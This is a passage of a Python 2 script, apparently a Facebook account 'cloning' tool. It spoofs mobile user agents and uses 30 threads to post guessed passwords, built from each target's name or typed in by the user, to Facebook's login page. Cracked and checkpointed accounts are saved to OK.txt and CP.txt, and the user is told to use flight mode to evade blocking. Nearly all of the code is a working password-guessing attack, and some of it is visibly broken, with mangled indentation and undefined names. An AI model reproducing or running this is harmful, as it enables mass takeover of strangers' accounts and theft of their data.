 'Mozila/5.0 (Linux; Android 7.1.1; CPH1727 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.81 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.5.1304 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.111 Mobile Safari/537.36 OPR/50.0.2254.149182',
 'Mozila/5.0 (Linux; Android 5.1.1; A33f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 11; vivo 1915; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.6.5',
 'Mozila/5.0 (Linux; Android 8.1.0; vivo 1811 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/5.9.1.5',
 'Mozila/5.0 (Linux; U; Android 6.0; CPH1609 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.75 Mobile Safari/537.36 OPR/51.0.2254.150807',
 'Mozila/5.0 (Linux; Android 6.0.1; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.106 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 7.1.1; en-US; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.8.1301 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.111 Mobile Safari/537.36 OPR/50.0.2254.149182',
 'Mozila/5.0 (Linux; Android 5.0.2; vivo Y51L Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36 OPT/2.6',
 'Mozila/5.0 (Linux; U; Android 5.1.1; ar-SA; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.8.1305 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 7.1.1; en-US; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.13.0.1207 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 OPR/47.0.2254.146760',
 'Mozila/5.0 (Linux; Android 6.0.1; vivo 1606 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10',
 'Mozila/5.0 (Linux; Android 7.1.1; CPH1727 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.81 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP',
 'Mozila/5.0 (Linux; Android 5.1; vivo Y21 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36 VivoBrowser/5.1.23',
 'Mozila/5.0 (Linux; U; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 OPR/51.0.2254.150807',
 'Mozila/5.0 (Linux; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 6.0.1; vivo 1606 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 OPR/52.1.2254.54298',
 'Mozila/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.11.5.1185 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36 YaApp_Android/9.66 YaSearchBrowser/9.66',
 'Mozila/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.2.2461.137690',
 'Mozila/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/54.0.2254.56148',
 'Mozila/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 4.2.2; vivo Y28 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.66 Mobile Safari/537.36 OPR/55.0.2254.56695',
 'Mozila/5.0 (Linux; Android 8.1.0; OPPO CPH1803 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36 AlohaBrowser/2.22.0',
 'Mozila/5.0 (Linux; U; Android 8.1.0; en-US; vivo 1801 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 UCBrowser/11.4.8.1012 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 5.1.1; A33f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 GSA/11.36.10.23.arm',
 'Mozila/5.0 (Linux; Android 5.1.1; F1f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Mobile Safari/537.36 OPR/37.0.2192.105989',
 'Mozila/5.0 (Linux; Android 6.0.1; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36,gzip(gfe)',
 'Mozila/5.0 (Linux; U; Android 6.0; CPH1609 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 OPR/51.0.2254.150807',
 'Mozila/5.0 (Linux; Android 8.1.0; vivo 1724 Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/5.5.0',
 'Mozila/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.79 Mobile Safari/537.36 GSA/10.87.15.21.arm'
]

logo="""
\x1b[1;91m  _   _    __    __  __    __    _  _  __  __  _  _ 
\x1b[1;92m ( )_( )  /__\  (  \/  )  /__\  ( \/ )(  )(  )( \( )
\x1b[1;93m  ) _ (  /(__)\  )    (  /(__)\  \  /  )(__)(  )  ( 
\x1b[1;91m (_) (_)(__)(__)(_/\/\_)(__)(__) (__) (______)(_)\_)
\x1b[1;91m -----------------------------------------------------
\033[1;92m   Author   : \033[1;92mHamayun Khan
\033[1;92m   Github   : \033[1;92mhttps://github.com/hamayun01
 \033[1;92m  Facebook :\033[1;92m Hamayun Khan
\x1b[1;91m-----------------------------------------------------
  """

host="https://mbasic.facebook.com"
ips=None
try:
	b=requests.get("http://ip-api.com/json/").json()["query"]
	ips=requests.get("http://ip-api.com/json/"+b,headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["Pakistan"].lower()
except:
	ips=None

ok = []
cp = []
ttl =[]


def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
    
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "fuck you baby" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("[!] Wrong Cookies")

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()

def hdcok():
	global host
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result8

def main():
    os.system("clear")
    print(logo)
    print(" \x1b[1;93m    \tMAIN MENU")
    print 47 * '\x1b[1;92m\xe2\x95\x90'
    print(" \x1b[1;92m     [1] START CLONING")
    print(" \x1b[1;92m     [2] CONTACT ME ON WTSP")
    print(" \x1b[1;92m     [3] EXIT")
    print 47 * '\x1b[1;92m\xe2\x95\x90'
    log_sel()
def log_sel():
	sel = raw_input("\033[93;1m  CHOOSE: ")
	if sel =="1":
		menu()
	if sel =="2":
		os.system('xdg-open https://www.facebook.com/ham143mah')
		os.system('exit')
	if sel =="3":
		exit()
	else:
		print("")
		print("\tSelect valid option")
		print("")
		log_select()



def menu():
    os.system('clear')
    print(logo)
    print 47 * '\x1b[1;91m\xe2\x95\x90'
    print("")
    print("\033[1;92m  [1] CRACK WITH AUTO PASS")
    print("\033[1;92m  [2] CRACK WITH MANUAL PASS")
    print('\033[1;92m  [0] BACK')
    print 47 * '\x1b[1;91m\xe2\x95\x90'
    menu_option()
    
def menu_option():
	select = raw_input("\x1b[1;97mChoose ---> ")
	if select =="1":
		crack()
	elif select =="2":
		choice()
	elif select =="0":
		main()
		
		
		
	else:
		print("\tSelect valid option")
		menu_option()

def crack():
	os.system("clear")
	print(logo)
	print("\x1b[1;97m-----------------------------------------------------")
	print("\033[1;92m  [1] CRACK FILE ")
	print("\033[1;92m  [2] BACK")
        print("\033[1;92m  [3] Extract")
	print("\x1b[1;97m-----------------------------------------------------")
	crack_select()
def crack_select():
	select = raw_input("\033[1;37mChoose ---> : \033[0;97m")
	id=[]
	oks=[]
	cps=[]
        if select =="1":
		os.system("clear")
		print(logo)
		print 
		filelist = raw_input('\033[92;1m  INPUT FILE: ')
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print(" \033[1;37mRequested file not found\033[0;98m")
			raw_input(" Press enter to back ")
			crack()
	elif select =="2":
	    menu()
        elif select =="3":
                os.system("python2 ext")

	else:
		print("\tSelect valid option\033[0;97m")
		choice_select()
	print("\x1b[1;33m----------------------------------------------------")
	print(" \x1b[1;90m     Use flight mode before use")
	print("\x1b[1;33m---------------------------------------------------")
	print''
	print(" \x1b[1;93m               Total idz :\x1b[1;92m "+str(len(id)))
	print("\x1b[1;92m----------------------------------------------------")
	print(" \x1b[1;97m           CLONING HAS BEEN STARTED...")
	print("\x1b[1;92m-----------------------------------------------------")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		sharagent = random.choice(us)
		session = requests.Session()
		session.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":sharagent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		host="https://mbasic.facebook.com"
		try:
			ps1 = name.lower().split(' ')[0] + '1234'
			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps1, 'login': 'submit'})
			sp = data.content
			if 'mbasic_logout_button' in sp or 'save-device' in sp:
				print(' \x1b[1;92m[OK] '+uid+' | '+ps1+'\033[0;97m')
				ok = open('OK.txt', 'a')
				ok.write(uid+'|'+ps1+'\n')
				ok.close()
				oks.append(uid+ps1)
			else:
				if 'checkpoint' in sp:
					print(' \x1b[1;91m[CP] '+uid+' | '+ps1+'\033[0;97m')
					cp = open('CP.txt', 'a')
					cp.write(uid+'|'+ps1+'\n')
					cp.close()
					cps.append(uid+ps1)
				else:
					ps2 = name.lower().split(' ')[0] + '786'
					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps2, 'login': 'submit'})
					sp = data.content
					if 'mbasic_logout_button' in sp or 'save-device' in sp:
						print(' \x1b[1;92m[OK] '+uid+' | '+ps2+'\033[0;97m')
						ok = open('OK.txt', 'a')
						ok.write(uid+'|'+ps2+'\n')
						ok.close()
						oks.append(uid+ps2)
					else:
						if 'checkpoint' in sp:
							print(' \x1b[1;93m[CP] '+uid+' | '+ps2+'\033[0;97m')
							cp = open('CP.txt', 'a')
							cp.write(uid+'|'+ps2+'\n')
							cp.close()
							cps.append(uid+ps2)
						else:
							ps3 = name.lower().split(' ')[0] + '12'
							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps3, 'login': 'submit'})
							sp = data.content
							if 'mbasic_logout_button' in sp or 'save-device' in sp:
								print(' \x1b[1;92m[OK] '+uid+' | '+ps3+'\033[0;97m')
								ok = open('OK.txt', 'a')
								ok.write(uid+'|'+ps3+'\n')
								ok.close()
								oks.append(uid+ps3)
							else:
								if 'checkpoint' in sp:
									print(' \x1b[1;97m[CP] '+uid+' | '+ps3+'\033[0;97m')
									cp = open('CP.txt', 'a')
									cp.write(uid+'|'+ps3+'\n')
									cp.close()
									cps.append(uid+ps3)
								else:
									ps4 = name.lower().split(' ')[0] + '1122'
									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps4, 'login': 'submit'})
									sp = data.content
									if 'mbasic_logout_button' in sp or 'save-device' in sp:
										print(' \x1b[1;92m[OK] '+uid+' | '+ps4+'\033[0;97m')
										ok = open('OK.txt', 'a')
										ok.write(uid+'|'+ps4+'\n')
										ok.close()
										oks.append(uid+ps4)
									else:
										if 'checkpoint' in sp:
											print(' \x1b[1;94m[CP] '+uid+' | '+ps4+'\033[0;97m')
											cp = open('CP.txt', 'a')
											cp.write(uid+'|'+ps4+'\n')
											cp.close()
											cps.append(uid+ps4)
										else:
											ps5 = 'khan1122'
											data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps5, 'login': 'submit'})
											sp = data.content
											if 'mbasic_logout_button' in sp or 'save-device' in sp:
												print(' \x1b[1;92m[OK] '+uid+' | '+ps5+'\033[0;97m')
												ok = open('OK.txt', 'a')
												ok.write(uid+'|'+ps5+'\n')
												ok.close()
												oks.append(uid+ps5)
											else:
												if 'checkpoint' in sp:
													print(' \x1b[1;97m[CP] '+uid+' | '+ps5+'\033[0;97m')
													cp = open('CP.txt', 'a')
													cp.write(uid+'|'+ps5+'\n')
													cp.close()
													cps.append(uid+ps5)
												else:
													ps6 = name.lower().split(' ')[1] + '1234'
											data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps6, 'login': 'submit'})
											sp = data.content
											if 'mbasic_logout_button' in sp or 'save-device' in sp:
												print(' \x1b[1;92m[OK] '+uid+' | '+ps6+'\033[0;97m')
												ok = open('OK.txt', 'a')
												ok.write(uid+'|'+ps6+'\n')
												ok.close()
												oks.append(uid+ps6)
											else:
												if 'checkpoint' in sp:
													print(' \x1b[1;95m[CP] '+uid+' | '+ps6+'\033[0;97m')
													cp = open('CP.txt', 'a')
													cp.write(uid+'|'+ps6+'\n')
													cp.close()
													cps.append(uid+ps6)
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\x1b[1;97m------------------------\x1b[1;97m------------------------")
	print ("\x1b[1;91m[!]\x1b[1;97mProcess has been complete")
	print("\033[92;1m ToTaL \033[92;1mOK\033[97;1m/\033[97;1mCP: "+str(len(oks))+"/"+str(len(cps)))
	raw_input("\x1b[1;97mPress Enter to Back To Menu ")
	menu()
def choice():
	os.system("clear")
	print(logo)
	print("\x1b[1;97m-----------------------------------------------------")
	print("\x1b[1;92m [1]\x1b[1;97m Crack File \x1b[1;92m   [3  Pass]")
	print("\x1b[1;92m [2]\x1b[1;97m Crack File \x1b[1;92m   [5  Pass]")
	print("\x1b[1;92m [3]\x1b[1;97m Crack File \x1b[1;92m   [7  Pass]")
	print("\x1b[1;92m [4]\x1b[1;97m Crack File \x1b[1;92m   [10 Pass]")
	print("\x1b[1;92m [0]\x1b[1;97m Back")
	print("\x1b[1;97m-----------------------------------------------------")
	choice_select()
def choice_select():
	select = raw_input("\x1b[1;97mChoose ---> ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		ps = raw_input("\033[1;92m[!]\x1b[1;92m Password1: ")
		ps2 = raw_input("\033[1;92m[!]\x1b[1;92m Password2: ")
		ps3 = raw_input("\033[1;92m[!]\x1b[1;92m Password3: ")
		filelist = raw_input('\033[92;1m  INPUT FILE: ')
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;97mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			choice()
	elif select =="2":
		os.system("clear")
		print(logo)
		ps = raw_input("\033[1;92m[!]\x1b[1;92m Password1: ")
		ps2 = raw_input("\033[1;92m[!]\x1b[1;92m Password2: ")
		ps3 = raw_input("\033[1;92m[!]\x1b[1;92m Password3: ")
		ps4 = raw_input("\033[1;92m[!]\x1b[1;92m Password4: ")
		ps5 = raw_input("\033[1;92m[!]\x1b[1;92m Password5: ")
		filelist = raw_input("\x1b[1;92m[!]\x1b[1;92m File : \x1b[1;97m")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;37mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			choice()
	elif select =="3":
		os.system("clear")
		print(logo)
		ps = raw_input("\033[1;92m[!]\x1b[1;97m Password1: ")
		ps2 = raw_input("\033[1;92m[!]\x1b[1;97m Password2: ")
		ps3 = raw_input("\033[1;92m[!]\x1b[1;97m Password3: ")
		ps4 = raw_input("\033[1;92m[!]\x1b[1;97m Password4: ")
		ps5 = raw_input("\033[1;92m[!]\x1b[1;97m Password5: ")
		ps6 = raw_input("\033[1;92m[!]\x1b[1;97m Password6: ")
		ps7 = raw_input("\033[1;92m[!]\x1b[1;97m Password7: ")
		filelist = raw_input("\x1b[1;92m[!]\x1b[1;97m File : \x1b[1;97m")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;37mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			choice()
	elif select =="4":
		os.system("clear")
		print(logo)
		ps = raw_input("\033[1;92m[!]\x1b[1;92m Password1: ")
		ps2 = raw_input("\033[1;92m[!]\x1b[1;92m Password2: ")
		ps3 = raw_input("\033[1;92m[!]\x1b[1;92m Password3: ")
		ps4 = raw_input("\033[1;92m[!]\x1b[1;92m Password4: ")
		ps5 = raw_input("\033[1;92m[!]\x1b[1;92m Password5: ")
		ps6 = raw_input("\033[1;92m[!]\x1b[1;92m Password6: ")
		ps7 = raw_input("\033[1;92m[!]\x1b[1;92m Password7: ")
		ps8 = raw_input("\033[1;92m[!]\x1b[1;92m Password8: ")
		ps9 = raw_input("\033[1;92m[!]\x1b[1;92m Password9: ")
		ps10 = raw_input("\033[1;92m[!]\x1b[1;92m Password10: ")
		filelist = raw_input("\x1b[1;92m[!]\x1b[1;93m File : \x1b[1;97m")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;37mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			choice()

		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;37mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			choice()
	elif select =="0":
	    menu()
	else:
		print("\tSelect valid option\033[0;97m")
		choice_select()
	print("\x1b[1;97m--------------------------------------------------------")
	print(" \x1b[1;91m     Use flight (airplane) mode before use")
	print("\x1b[1;97m----------------------------------------------------------")
	print''
	print(" \x1b[1;97m               Total idz :\x1b[1;92m "+str(len(id)))
	print("\x1b[1;97m----------------------------------------------------")
	print(" \x1b[1;93m        Please Wait Cloning started...")
	print("\x1b[1;97m-----------------------------------------------------")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		sharagent = random.choice(us)
		session = requests.Session()
		session.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":sharagent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		host="https://mbasic.facebook.com"
		try:
			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps, 'login': 'submit'})
			sp = data.content
			if 'mbasic_logout_button' in sp or 'save-device' in sp:
				print(' \x1b[1;92m [OK] '+uid+' | '+ps+'\033[0;97m')
				ok = open('OK.txt', 'a')
				ok.write(uid+'|'+ps+'\n')
				ok.close()
				oks.append(uid+ps)
			else:
				if 'checkpoint' in sp:
					print(' \x1b[1;91m [CP] '+uid+' | '+ps+'\033[0;97m')
					cp = open('CP.txt', 'a')
					cp.write(uid+'|'+ps+'\n')
					cp.close()
					cps.append(uid+ps)
				else:
					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps2, 'login': 'submit'})
					sp = data.content
					if 'mbasic_logout_button' in sp or 'save-device' in sp:
						print(' \x1b[1;92m [OK] '+uid+' | '+ps2+'\033[0;97m')
						ok = open('OK.txt', 'a')
						ok.write(uid+'|'+ps2+'\n')
						ok.close()
						oks.append(uid+ps2)
					else:
						if 'checkpoint' in sp:
							print(' \x1b[1;91m [CP] '+uid+' | '+ps2+'\033[0;97m')
							cp = open('CP.txt', 'a')
							cp.write(uid+'|'+ps2+'\n')
							cp.close()
							cps.append(uid+ps2)
						else:
							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps3, 'login': 'submit'})
							sp = data.content
							if 'mbasic_logout_button' in sp or 'save-device' in sp:
								print(' \x1b[1;92m [OK] '+uid+' | '+ps3+'\033[0;97m')
								ok = open('OK.txt', 'a')
								ok.write(uid+'|'+ps3+'\n')
								ok.close()
								oks.append(uid+ps3)
							else:
								if 'checkpoint' in sp:
									print(' \x1b[1;91m [CP] '+uid+' | '+ps3+'\033[0;97m')
									cp = open('CP.txt', 'a')
									cp.write(uid+'|'+ps3+'\n')
									cp.close()
									cps.append(uid+ps3)
								else:
									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps4, 'login': 'submit'})
									sp = data.content
									if 'mbasic_logout_button' in sp or 'save-device' in sp:
										print(' \x1b[1;92m [OK] '+uid+' | '+ps4+'\033[0;97m')
										ok = open('OK.txt', 'a')
										ok.write(uid+'|'+ps4+'\n')
										ok.close()
										oks.append(uid+ps4)
									else:
										if 'checkpoint' in sp:
											print(' \x1b[1;91m [CP] '+uid+' | '+ps4+'\033[0;97m')
											cp = open('CP.txt', 'a')
											cp.write(uid+'|'+ps4+'\n')
											cp.close()
											cps.append(uid+ps4)
										else:
											data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps5, 'login': 'submit'})
											sp = data.content
											if 'mbasic_logout_button' in sp or 'save-device' in sp:
												print(' \x1b[1;92m [OK] '+uid+' | '+ps5+'\033[0;97m')
												ok = open('OK.txt', 'a')
												ok.write(uid+'|'+ps5+'\n')
												ok.close()
												oks.append(uid+ps5)
											else:
												if 'checkpoint' in sp:
													print(' \x1b[1;91m [CP] '+uid+' | '+ps5+'\033[0;97m')
													cp = open('CP.txt', 'a')
													cp.write(uid+'|'+ps5+'\n')
													cp.close()
													cps.append(uid+ps5)
												else:
													data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps6, 'login': 'submit'})
													sp = data.content
													if 'mbasic_logout_button' in sp or 'save-device' in sp:
														print(' \x1b[1;92m [OK] '+uid+' | '+ps6+'\033[0;97m')
														ok = open('OK.txt', 'a')
														ok.write(uid+'|'+ps6+'\n')
														ok.close()
														oks.append(uid+ps6)
													else:
														if 'checkpoint' in sp:
															print(' \033[1;91m [CP] '+uid+' | '+ps6+'\033[0;97m')
															cp = open('CP.txt', 'a')
															cp.write(uid+'|'+ps6+'\n')
															cp.close()
															cps.append(uid+ps6)
														else:
															data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps7, 'login': 'submit'})
															sp = data.content
															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																print(' \x1b[1;92m [OK] '+uid+' | '+ps7+'\033[0;97m')
																ok = open('OK.txt', 'a')
																ok.write(uid+'|'+ps7+'\n')
																ok.close()
																oks.append(uid+ps7)
															else:
																if 'checkpoint' in sp:
																	print(' \x1b[1;91m [CP] '+uid+' | '+ps7+'\033[0;97m')
																	cp = open('CP.txt', 'a')
																	cp.write(uid+'|'+ps7+'\n')
																	cp.close()
																	cps.append(uid+ps7)
																else:
																	data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps8, 'login': 'submit'})
																	sp = data.content
																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																		print(' \x1b[1;92m [OK] '+uid+' | '+ps8+'\033[0;97m')
																		ok = open('OK.txt', 'a')
																		ok.write(uid+'|'+ps8+'\n')
																		ok.close()
																		oks.append(uid+ps8)
																	else:
																		if 'checkpoint' in sp:
																			print(' \x1b[1;91m [CP] '+uid+' | '+ps8+'\033[0;97m')
																			cp = open('CP.txt', 'a')
																			cp.write(uid+'|'+ps8+'\n')
																			cp.close()
																			cps.append(uid+ps8)
																		else:
																			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps9, 'login': 'submit'})
